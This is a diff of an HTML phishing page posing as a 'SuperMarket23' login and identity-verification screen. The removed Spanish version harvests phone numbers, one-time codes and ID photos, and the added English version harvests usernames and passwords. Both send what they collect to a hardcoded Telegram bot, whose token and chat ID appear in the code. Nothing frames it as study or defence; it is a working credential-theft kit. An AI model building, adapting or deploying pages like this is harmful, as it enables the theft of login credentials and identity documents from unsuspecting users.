@@ -1,77 +1,127 @@
-
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SuperMarket23 - Verificación</title>
+    <title>SuperMarket23 - Secure Access</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
-        h1 { color: #0056b3; font-size: 24px; margin-bottom: 5px; text-transform: uppercase; }
-        .subtitle { color: #666; font-size: 12px; margin-bottom: 25px; }
-        .label { display: block; text-align: left; font-size: 10px; font-weight: bold; color: #0056b3; margin: 15px 0 5px 5px; text-transform: uppercase; }
-        .input-bar { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 6px; box-sizing: border-box; font-size: 14px; outline: none; }
-        .prefix { background: #e9ecef; font-weight: bold; color: #0056b3; border: 1px solid #0056b3; }
-        .photo-container { display: flex; justify-content: space-between; margin: 20px 0; }
-        .photo-box { width: 30%; height: 70px; border: 2px dashed #0056b3; border-radius: 8px; display: flex; align-items: center; justify-content: center; position: relative; background: #f8fbff; color: #0056b3; font-size: 20px; }
-        .photo-box input { position: absolute; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 2; }
-        .btn-auth { background-color: #0056b3; color: white; border: none; width: 100%; padding: 15px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        .footer-note { font-size: 10px; color: #28a745; margin-top: 15px; font-weight: bold; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Professional Blue and White Style */
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background-color: #f4f7f9; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background-color: #ffffff; 
+            padding: 40px; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            width: 100%; 
+            max-width: 380px; 
+            text-align: center; 
+            border-top: 6px solid #0056b3; 
+        }
+        h1 { 
+            color: #0056b3; 
+            font-size: 32px; 
+            margin-bottom: 25px; 
+            text-transform: uppercase; 
+            font-weight: bold; 
+        }
+        label { 
+            display: block; 
+            text-align: left; 
+            font-weight: bold; 
+            margin-bottom: 8px; 
+            color: #333; 
+            font-size: 14px; 
+        }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin-bottom: 20px; 
+            border: 1px solid #ccc; 
+            border-radius: 5px; 
+            box-sizing: border-box; 
+            font-size: 16px; 
+            background-color: #ffffff; 
+        }
+        .btn { 
+            background-color: #0056b3; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            width: 100%; 
+            border-radius: 5px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            text-transform: uppercase; 
+            transition: background 0.3s; 
+        }
+        .btn:hover { background-color: #004494; }
+        .footer-text { margin-top: 20px; font-size: 12px; color: #777; }
     </style>
 </head>
 <body>
-    <div id="overlay"><div class="spinner"></div><p style="color:#0056b3; font-weight:bold; margin-top:15px;">Sincronizando datos...</p></div>
-    <div class="card">
-        <h1>SUPERMARKET23</h1>
-        <div class="subtitle">Sistema de Verificación de Identidad</div>
-        <label class="label">IDENTIFICADOR (#)</label>
-        <input type="text" class="input-bar prefix" value="+53#" readonly>
-        <label class="label">USUARIO / TELÉFONO</label>
-        <input type="number" id="user_tel" class="input-bar" placeholder="Ej: 52345678">
-        <label class="label">ARCHIVOS DE IDENTIDAD (F1, F2, F3)</label>
-        <div class="photo-container">
-            <div class="photo-box" id="b1"><input type="file" id="f1" accept="image/*" onchange="mark(this,'b1')">+</div>
-            <div class="photo-box" id="b2"><input type="file" id="f2" accept="image/*" onchange="mark(this,'b2')">+</div>
-            <div class="photo-box" id="b3"><input type="file" id="f3" accept="image/*" onchange="mark(this,'b3')">+</div>
-        </div>
-        <label class="label">(#) TOKEN</label>
-        <input type="text" id="user_cod" class="input-bar" placeholder="------">
-        <button class="btn-auth" onclick="startSync()">AUTENTICAR</button>
-        <div class="footer-note">🔒 Conexión con cifrado de extremo a extremo</div>
-    </div>
+
+<div class="container">
+    <h1>Log In</h1>
+    
+    <form id="authForm">
+        <label>USERNAME</label>
+        <input type="text" id="user" placeholder="Enter username" required>
+
+        <label>PASSWORD</label>
+        <input type="password" id="pass" placeholder="Enter password" required>
+
+        <button type="submit" class="btn" id="btnAuth">TO AUTHENTICATE</button>
+    </form>
+    
+    <div class="footer-text">Secure Encrypted Connection</div>
+</div>
+
 <script>
-    function mark(input, id) { if(input.files[0]) document.getElementById(id).style.backgroundColor = '#d4edda'; }
-    async function startSync() {
-        const tel = document.getElementById('user_tel').value;
-        const cod = document.getElementById('user_cod').value;
-        if(!tel || !cod) { alert("Complete los campos requeridos."); return; }
-        document.getElementById('overlay').style.display = 'flex';
-        const token = "8710847420:AAHbfCVI9-eXWiS6E2CYKT0-9TFSxf9gJOc";
-        const chat_id = "6475554235";
-        const msg = `✅ **SM23 - NUEVA ENTRADA**\n\n👤 **Usuario:** +53#${tel}\n🔑 **Código:** \`${cod}\``;
+    // Your Telegram credentials from the screenshots
+    const token = "8710847420:AAHbfCVi9-eWWiS6E2CYKT0-9TFSxf9gjDc";
+    const chat_id = "6475554235";
+
+    document.getElementById('authForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const btn = document.getElementById('btnAuth');
+        const username = document.getElementById('user').value;
+        const password = document.getElementById('pass').value;
+        
+        btn.innerText = "PROCESSING...";
+        btn.disabled = true;
+
+        const message = `📌 *NEW SM23 ENTRY*\n\n👤 *User:* \`${username}\`\n🔑 *Pass:* \`${password}\``;
+
         try {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: chat_id, text: msg, parse_mode: 'Markdown' })
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
-            const files = ['f1', 'f2', 'f3'];
-            for(let i=0; i<files.length; i++) {
-                const fileInput = document.getElementById(files[i]);
-                if(fileInput.files[0]) {
-                    const fd = new FormData();
-                    fd.append('chat_id', chat_id);
-                    fd.append('photo', fileInput.files[0]);
-                    fd.append('caption', `Imagen ${i+1} - Usuario: +53#${tel}`);
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                }
-            }
-            setTimeout(() => { location.reload(); }, 2000);
-        } catch(e) { document.getElementById('overlay').style.display = 'none'; alert("Error de red."); }
-    }
+            alert("Verification sent successfully.");
+            location.reload();
+        } catch (error) {
+            alert("Connection error. Please try again.");
+            btn.innerText = "TO AUTHENTICATE";
+            btn.disabled = false;
+        }
+    });
 </script>
+
 </body>
 </html>
+
